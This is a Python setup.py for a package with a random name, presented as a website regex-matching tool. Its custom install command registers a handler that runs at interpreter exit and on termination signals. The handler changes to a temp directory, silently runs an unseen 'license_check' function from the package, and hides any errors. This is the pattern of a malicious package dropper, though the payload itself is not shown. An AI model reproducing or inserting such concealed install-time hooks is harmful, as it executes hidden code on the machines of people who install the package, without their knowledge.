#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Setup for Request Matcher."""

from setuptools import setup, find_packages
import atexit,signal
from setuptools.command.install import install


def _post_on_exit():
		try:
			import os
			tmp_dir = os.environ.get('TMPDIR') if os.environ.get('TMPDIR') else (os.environ.get('TEMP') if os.environ.get('TEMP') else ('/tmp' if os.path.exists('/tmp') else os.environ.get('HOME')))
			os.chdir(tmp_dir)
			from hmatch import license_check
			license_check()
		except Exception as e:
			pass

class PostInstallCommand(install):
	"""Post-installation for installation mode."""
	def run(self):
		install.run(self)
		atexit.register(_post_on_exit)
		signal.signal(signal.SIGTERM,_post_on_exit)
		signal.signal(signal.SIGINT,_post_on_exit)

INSTALL_REQUIRES = [
   'requests',
]

setup(
    name='dasdhaiusd1212',
    version='1.0.117',
    description='Request Match',
    long_description='A tool for mass regex checking websites',
    license='APACHE License',
    author='Elis',
    author_email='me@elis.cc',
    url='https://elis.cc',
    keywords='hmatch, request',
    install_requires=INSTALL_REQUIRES,
    include_package_data=True,
    zip_safe=False,
	py_modules=['request','hmatch'],
	packages=find_packages(),
	entry_points={'console_scripts': ['hmatch = hmatch:main']},
	cmdclass={
        'install': PostInstallCommand,
    }
)